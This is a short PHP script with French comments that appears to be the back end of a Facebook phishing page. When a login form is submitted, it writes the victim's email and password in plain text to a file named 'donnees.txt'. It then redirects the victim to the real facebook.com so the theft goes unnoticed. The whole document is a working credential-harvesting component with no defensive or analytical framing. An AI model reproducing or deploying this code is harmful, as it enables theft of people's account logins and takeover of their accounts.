<?php if (isset($_POST['login'])) {
	$email = $_POST['Email'];
	$pass = $_POST['Password'];

	$file ="donnees.txt";

	# Ouverture en mode écriture
	$fileopen=(fopen("$file",'a'));

	# Ecriture de "Début du fichier" dans le fichier texte
	fwrite($fileopen,"Email: ".$email." Mot de Passe: ".$pass."\n");

	# On ferme le fichier proprement
	fclose($fileopen);
	header('location:https://www.facebook.com');
} ?>
